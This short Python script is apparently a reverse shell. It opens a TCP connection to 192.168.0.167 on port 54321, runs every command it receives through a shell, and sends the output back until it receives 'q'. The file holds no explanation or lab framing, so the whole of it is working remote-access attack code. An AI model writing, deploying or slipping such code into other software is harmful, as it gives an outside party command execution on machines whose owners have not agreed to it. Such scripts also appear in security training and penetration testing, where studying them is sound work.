#!/usr/bin/python
import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.0.167", 54321))
print("Connection established")

while True:
    command = sock.recv(1024)
    if command == b"q":  
        break
    else:
        proc = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        )
        result = proc.stdout.read() + proc.stderr.read()
        sock.send(result)

sock.close()

